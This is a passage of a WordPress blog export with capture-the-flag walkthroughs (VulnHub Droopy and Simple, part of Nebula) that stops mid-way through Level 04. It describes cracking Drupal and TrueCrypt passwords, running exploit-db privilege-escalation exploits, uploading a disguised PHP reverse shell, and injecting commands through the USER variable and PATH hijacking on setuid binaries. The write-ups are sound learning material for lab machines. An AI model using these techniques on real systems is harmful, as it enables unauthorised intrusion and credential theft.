hostname is:
HOSTNAME=dhcppc5
#In the hosts file I find this.
127.0.1.1	droopy.knight139.co.uk	droopy
[/code]

I remembered that every web-server that runs mysql has the logins for it in some file. So after some snooping-around I found the file:

[code]
/var/www/html/sites/default

$databases = array (
  'default' =&gt; 
  array (
    'default' =&gt; 
    array (
      'database' =&gt; 'drupal',
      'username' =&gt; 'drupaluser',
      'password' =&gt; 'nimda',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',
    ),
  ),
);
[/code]

So I log in to mysql.

[code]
mysql -u drupaluser -p drupal
password: nimda

SHOW tables;

mysql&gt; SELECT * FROM users;
SELECT * FROM users;

$S$DLx/ePXpg18r5tnZs8aHkngNTWpyjyMLvPvC0gdaEjo4agY8Iyym
[/code]


So I went here: http://www.onlinehashcrack.com/hash-identification.php#res
To identify what type of hash it was.

It turns out it is a SHA-512.
- SHA-512(Drupal) 

I study the commands of hashcat and found this:

[code]
hashcat -m 7900 -a 0 -o found.txt admin.hash /usr/share/hashcat/rules/rockyou-30000.rule
[/code]
7900 is the drupal-mode.

Meanwhile I continue to look around and found an email in /var/spool/mail:

[code]
From Dave &lt;dave@droopy.example.com&gt; Wed Thu 14 Apr 04:34:39 2016
Date: 14 Apr 2016 04:34:39 +0100
From: Dave &lt;dave@droopy.example.com&gt;
Subject: rockyou with a nice hat!
Message-ID: &lt;730262568@example.com&gt;
X-IMAP: 0080081351 0000002016
Status: NN

George,

   I've updated the encrypted file... You didn't leave any
hints for me. The password isn't longer than 11 characters
and anyway, we know what academy we went to, don't you...?

I'm sure you'll figure it out it won't rockyou too much!

If you are still struggling, remember that song by The Jam

Later,
Dave
[/code]

Okay, so it talks about an encrypted file. From a guy named Dave.

It looks like the encrypted file can be decrypted with a password that is found in the rockyou dictionary.
We also know that the password is less than 11 characters, and it has something to do with an academy.
And it is also the name of a song by the Jam. 

So I started listening to some songs by The Jam a start looking for the encrypted file. But I couldn't really find anything useful.

After some minor cheating I learn that it is a good idea to look for privilege-escalation exploits. So I search exploit-database again and find several exploits. I download this one: https://www.exploit-db.com/exploits/37292/
Transfered it over to the VM with nc. Then gcc, chmod and execute, and now I am root. BOOM! Fast when stuff just works.

In /root i found a file called dave.tc.
After some googeling I found out that .tc probably is a true-crypt file. And after some more googeling I learned that there is a program called truecrack.
After a lot of struggling I found that with sed we can remove all words in our dictionary that are shorter than 11 characters.

I did it with this command.
The -i flag is important. It makes the changes in the current file. Without it nothing happens. As I learned.
[code]
sed -i -r '/^.{0,10}$/d' rr.txt   
[/code]
So now we have a list with 1.8 millions.
wc -l rr.txt                                                                              
1879453 rr.txt

Then I did
grep acade rr.txt &gt; rr2.txt

To get all words containing the work academy. As it was mentioned in the email.

Then again:
[code]
truecrack -t dave.tc -k sha512 -b 8 -w rr2.txt -v 

Found password:		&quot;etonacademy&quot;
Password length:	&quot;12&quot;
[/code]

On this page I learned how to mount a truecrypt-volume. So I did that.
https://tails.boum.org/doc/encryption_and_privacy/truecrypt/index.en.html

[code]
mkdir /media/dave

mount /dev/mapper/dave /media/dave
ls /media/dave/
buller  lost+found  panama
[/code]

In the buller dir there is a file called bullingdon-crest. 
https://en.wikipedia.org/wiki/Bullingdon_Club

Now I get it. The Dave character is David Cameron. And I guess the shares.jpg refers to his corrupt family's holdings in off-shore banks. And the pig in .secret is of course the infamous pig he most likely fucked. And in the .top dir is the flag. Pretty clever ending to a great VM!

<h2>Conclusion</h2>
So on this VM I really learned a lot!
The most important thing I think was: always check the exploit-database!
All it really took was to search for two exploits to gain root. First to enter drupal-admin and then to elevate to root.

I really liked it because it felt very real. The drupal and priv-escalation exploits are both very real. Thanks to knightmare for a great VM!]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1091</wp:post_id>
		<wp:post_date>2016-05-01 22:35:02</wp:post_date>
		<wp:post_date_gmt>2016-05-01 22:35:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-droopy</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_295f2e401072a55fcfde7d157936cd11</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f8e496b4490ca169a2aac8e66bf1a203</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_223cb67f08e4fe58d2fb14513567afec</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_00ea6fc5c32fc718ffb114e79fa4bb44</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_be22842c45f68892efb37cb3ce72109c</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-exploitsdatabase"><blockquote class="wp-embedded-content"><a href="https://www.exploit-db.com/search/">Search the Exploit Database</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute("style"),"height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.exploit-db.com/search/embed/" width="600" height="338" title="&#8220;Search the Exploit Database&#8221; &#8212; Exploits Database" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_be22842c45f68892efb37cb3ce72109c</wp:meta_key>
			<wp:meta_value><![CDATA[1462134065]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_df45a48439dc71930ccaf11861942bd3</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_31ded274867777d600b678c4b2176981</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_8ad5f0513a256f316989467f400ebf65</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_9f600c7782fc7f1ec59c72fac24326cc</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22375197352]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d5f4193a18ac99236fabf8920d85a6dd</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_919903d6cb9c08261a76e425fe9c3935</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b4b5f7d85f32dc49a3365fca185bafb2</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_87d1b49d81ebb2c811934a599d3d17ea</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_64019a5346e854f76835aa545c3fe9f1</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4375bb139f28bb1d087c0d2dd0e3f5e6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_dbd8d2a1485473beb215b5de524fa75b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_09804befbd6fffe19ce1e9f037b5510b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Walkthrough Simple</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/05/02/walkthrough-simple/</link>
		<pubDate>Mon, 02 May 2016 22:52:35 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1203</guid>
		<description></description>
		<content:encoded><![CDATA[I tried out another vulnerable machine. This one was called Simple. And can be found <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">here</a>.

So I started out as usual by locating the machine.
[code]
 $ netdiscover -r 192.168.1.1/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                   2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     e8:de:27:31:15:ee      1      60  TP-LINK TECHNOLOGIES CO.,LTD.                                                                     
 192.168.1.103   08:00:27:60:21:5c      1      60  Cadmus Computer Systems       
[/code]

[code]
nmap -A -O -T4 -p- -vv 192.168.1.102 

[/code]

Only port 80 open. Si I browser over there. 
I was met by an the interface of some kind of new-service called CuteNews. It had the version written on the first page. CuteNews v.2.0.3. And what I had learned from the last VM I did was that it is always a good idea to search for exploits (duh). So before going a head with dirbuster/zap/nikto/whatevs I just searched fore CuteNews in exploit-db. And that was a great idea. 
So I just checked out the very first that came up, and it looked easy. It was <a href="https://www.exploit-db.com/exploits/37474/">this one</a>. So I went ahead and created and account, renamed my php-reverse-shell.php to shell.jpg. Then I intercepted it with burp-suite and changed the name back to php.
And then I just started nc with nv -lvp 4444. And after visiting: cutenews.dev/uploads/avatar_username_shell.php I was rewarded with a shell.
I sent over my enumeration-script that I am working on with netcat.

[code][/code]
nc -lvp 3333 &gt; enum.sh
nc 192.168.1.103 &lt; enum.sh
[code][/code]

I soon found out that it has the same privesc-vulnerability as the machine I was working on the other day. So I already had the exploit ready to go. It was <a href="https://www.exploit-db.com/exploits/37292/">this one</a>. I sent it over with netcat and then compiled it with gcc, then chmod +x. And then I was root, and got the flag in the /root folder. 
https://www.exploit-db.com/exploits/37474/

<h2>Conclusion</h2>
I felt like all the hard work before really payed off on this one. I knew the exploits, I knew how to transfer files easily. This was a great little project.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1203</wp:post_id>
		<wp:post_date>2016-05-02 22:52:35</wp:post_date>
		<wp:post_date_gmt>2016-05-02 22:52:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>walkthrough-simple</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="pen-testing"><![CDATA[pen-testing]]></category>
		<category domain="post_tag" nicename="security"><![CDATA[security]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<category domain="post_tag" nicename="vulnhub"><![CDATA[vulnhub]]></category>
		<category domain="post_tag" nicename="wargames"><![CDATA[wargames]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_957e10bbe4333a40ea2f512d4c01a844</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-exploitsdatabase"><blockquote class="wp-embedded-content"><a href="https://www.exploit-db.com/exploits/">Exploit</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute("style"),"height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.exploit-db.com/exploits/embed/" width="600" height="338" title="&#8220;Exploit&#8221; &#8212; Exploits Database" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_957e10bbe4333a40ea2f512d4c01a844</wp:meta_key>
			<wp:meta_value><![CDATA[1462227267]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4eea3a9e8cc01d2833959c9aaab8fedc</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-exploitsdatabase"><blockquote class="wp-embedded-content"><a href="https://www.exploit-db.com/exploits/">Exploit</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute("style"),"height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.exploit-db.com/exploits/embed/" width="500" height="282" title="&#8220;Exploit&#8221; &#8212; Exploits Database" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_cf20f174238295008bb305a4cd2e68c0</wp:meta_key>
			<wp:meta_value><![CDATA[<div class="embed-exploitsdatabase"><blockquote class="wp-embedded-content"><a href="https://www.exploit-db.com/exploits/">Exploit</a></blockquote><script type='text/javascript'><!--//--><![CDATA[//><!--		!function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11./),i=b.querySelectorAll("iframe.wp-embedded-content");for(c=0;c<i.length;c++)if(d=i[c],!d.getAttribute("data-secret")){if(f=Math.random().toString(36).substr(2,10),d.src+="#?secret="+f,d.setAttribute("data-secret",f),g||h)a=d.cloneNode(!0),a.removeAttribute("security"),d.parentNode.replaceChild(a,d)}else;}}var d=!1,e=!1;if(b.querySelector)if(a.addEventListener)d=!0;if(a.wp=a.wp||{},!a.wp.receiveEmbedMessage)if(a.wp.receiveEmbedMessage=function(c){var d=c.data;if(d.secret||d.message||d.value)if(!/[^a-zA-Z0-9]/.test(d.secret)){var e,f,g,h,i,j=b.querySelectorAll('iframe[data-secret="'+d.secret+'"]'),k=b.querySelectorAll('blockquote[data-secret="'+d.secret+'"]');for(e=0;e<k.length;e++)k[e].style.display="none";for(e=0;e<j.length;e++)if(f=j[e],c.source===f.contentWindow){if(f.removeAttribute("style"),"height"===d.message){if(g=parseInt(d.value,10),g>1e3)g=1e3;else if(200>~~g)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);//--><!]]]]><![CDATA[></script><iframe sandbox="allow-scripts" security="restricted" src="https://www.exploit-db.com/exploits/embed/" width="600" height="338" title="&#8220;Exploit&#8221; &#8212; Exploits Database" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe></div>]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[22411836956]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_4eea3a9e8cc01d2833959c9aaab8fedc</wp:meta_key>
			<wp:meta_value><![CDATA[1462229560]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_time_cf20f174238295008bb305a4cd2e68c0</wp:meta_key>
			<wp:meta_value><![CDATA[1462229561]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Nebula Walkthrough</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/05/08/nebula-walkthrough/</link>
		<pubDate>Sun, 08 May 2016 22:38:50 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1235</guid>
		<description></description>
		<content:encoded><![CDATA[I started doing the challenges in Nebula. They are not as fun as boot2root VM:s but still entertaining. And I have learned some new stuff from it.
I have decided to write down all the levels in this one post, otherwise it would be too many short posts. So this is going to be a giant one, and sometimes way to much detail, and somtimes not enough, of well. Let's start.

<h2>Level 00</h2>
We just need to find the flag on this level.

[code]
$ find / -user flag00 -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
[/code]
Search for user flag00, with permission 4000, executable. List the
output. Throw stderr in /dev/null.

[code]
cd /bin
cd &quot;...&quot;
./flag00
getflag
[/code]

<h2>Level 01</h2>
On this level we are provided with code written in C and the binary version of it. It can be found here: /home/flag01/flag01

[code]
$ file flag01
flag01: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
[/code]
So we know that it is a 32bit setuid-binary. So when we run the binary the code that gets executed gets executed as the user flag01.

[code]
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
[/code]

Since I am a total noob in C I am going to comment this code pretty heavy to understand what is going on.

[code lang="c"]
#include &lt;stdlib.h&gt;
// This is what is says. C's standard library. Useful general
// purpose functions. Generating random numbers, conversions, memory allocation: malloc
// process control. It is from this lib that &quot;system&quot; is taken.

#include &lt;unistd.h&gt;
// Provides access to POSIX API.
// Gives the programmer access to NULL pointer, and symbolic constants like SEEK_SET

#include &lt;string.h&gt;
// A library for manipulating strings.

#include &lt;sys/types.h&gt;
// This library gives access to different data-types. Like gid_t.

#include &lt;stdio.h&gt;
// The standard input and output library.
// printf and scanf are among those functions. printf outputs, and scanf takes input.

int main(int argc, char **argv, char **envp)
// Here we initiate the main function, we do this with three arguments.
// argc is the number of argumnets. Argument count. The count starts from the
// calling of the binary. So ./flag01 is the first argument.
// argv are the argumnets that the user inputs. In this program it appears to be none.
// envp is an array of the environment variables.
{

  gid_t gid;
  uid_t uid;
// Here we declare two variables, but we don't assign them any value.
// We use the data-typs that come from sys/types-lib.
// The data-types are group-id and user-id.

  gid = getegid();
  uid = geteuid();

// This gets the group-id and user-id of the current user. Which is flag01.
// And we assign the the value to the previously created variables.

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

// So this sets the real, effective and saved uID.

  system(&quot;/usr/bin/env echo and now what?&quot;);

// This uses the system-function, which let us use the unix-commands/programs.
// The commands run are first printing the environment variables, and then it echos &quot;and now what?&quot;

}
[/code]

How can this then be exploited? Since there is no user-input.
So I figure that I can overwrite the echo-command with a command that I call echo, but does something else.

This kind of explains the way to do this.
<a href="http://unix.stackexchange.com/questions/29608/why-is-it-better-to-use-usr-bin-env-name-instead-of-path-to-name-as-my">link</a>

So I wrote that program in bash
[code lang="bash"]
#!/bin/bash
/bin/bash
[/code]

Then chmod +x echo, and export PATH=/tmp:$PATH. Now, it is important here to add the echo to the beginning of the PATH-variable, otherwise it will execute the normal echo.

[code]
./flag01
whoami
flag01
[/code]
We got the flag!

<h2>Level 02</h2>
So on this level we have another setuid to play with.

[code]
cd /home/flag02
level02@nebula:/home/flag02$ file flag02
flag02: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
[/code]

Let's run it and see what happens.

[code]
level02@nebula:/home/flag02$ ./flag02
about to call system(&quot;/bin/echo level02 is cool&quot;)
level02 is cool
[/code]
This looks a bit like the first level. But let's analyze the code.

[code lang="c"]
#include &lt;stdlib.h&gt;
// Standard-lib.

#include &lt;unistd.h&gt;
// Lib to get getegid()

#include &lt;string.h&gt;
// Lib to manipulate strings

#include &lt;sys/types.h&gt;
// Get new data-types, like gid_t

#include &lt;stdio.h&gt;
// Standard i/o. printf, scanf for example

int main(int argc, char **argv, char **envp)
{
  char *buffer;

// Declare the variable buffer.

  gid_t gid;
  uid_t uid;

// Declare variables.

  gid = getegid();
  uid = geteuid();

// Assign uID and gID into the created varibles.

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

// Set UID.

  buffer = NULL;

// Assign the value NULL to the buffer-varible.

  asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));
// Lets break it down.
// asprintf auto-allocate memory, it doesn't have to receive a specific buffer-size.
// it acquires it dynamically. In a way it is a way to defend against buffer overflow. Since the buffer cant be overflown because it is dynamic, I think.
// asprinf calculates the length of the string, allocates the amount of memory
// and then writes the string into that memory.

  printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);

// So, the asprintf takes the getenv-username and inputs it into the buffer.
// Then we make a system-call using that buffer.

  system(buffer);
}
[/code]

Okay, so no user-input is possible. So the solution will be elsewhere.
So we make a system-call that is the following:
"/bin/echo username (taken from en-var) is cool"

So the solution that comes to mind is to insert a username that would be something like
the following: hello &amp;&amp; /bin/bash # echo

So I set the username in my environment variable like this: 
[code]
USER=&quot;&amp;&amp; /bin/bash #&quot;
[/code]
Then I ran the script, and it gave me the shell, and
 then I could just run getflag.

<h2>Level 03</h2>
So on this level we have one file and one directory.

[code]
level03@nebula:/home/flag03$ ls -lah
total 5.5K
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     180 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
[/code]
The dir is read and writable. And the writable.sh-file looks like this:

[code lang="bash"]
#!/bin/sh
for i in /home/flag03/writable.d/* ; 
	(ulimit -t 5; bash -x &quot;$i&quot;)
	rm -f &quot;$i&quot;
done
[/code]

So here we can se that it takes all the scripts in writable.d and executes them, every few minutes, with a cronjob.
So after a lot of work, and a lot of testing. Like copying the sh and much other. i realized I didn't have to get a shell, all i need is to execute getflag on the machine.

So I just wrote the following script:
[code]
#!/bin/bash
getflag &gt; /tmp/flaggan.txt
[/code]

I also tried to copy the shell from the flag03-user and give me permissions to use it, but it didn't work. Not really sure why. But anyways, I got the flag.

<h2>Level 04</h2>
"About
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04."


[code lang="c"]
#include &lt;stdlib.h&gt;
// Standard lib

#include &lt;unistd.h&gt;
// getresid comes from here i think

#include &lt;string.h&gt;
// Lib to manipulate strings

#include &lt;sys/types.h&gt;
// Includes the datatype guid

#include &lt;stdio.h&gt;
// Standard I/O

#include &lt;fcntl.h&gt;
// The file control-options.
// To input output files, open them, close them, open dirs etc

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
// Here the buffer. The buffer is a kind of intermediare between memory and program.
// So the buffer have a maximum of 1024 bytes. That is one kilobyte.

  int fd, rc;
// Here we declare two variables.

  if(argc == 1) {
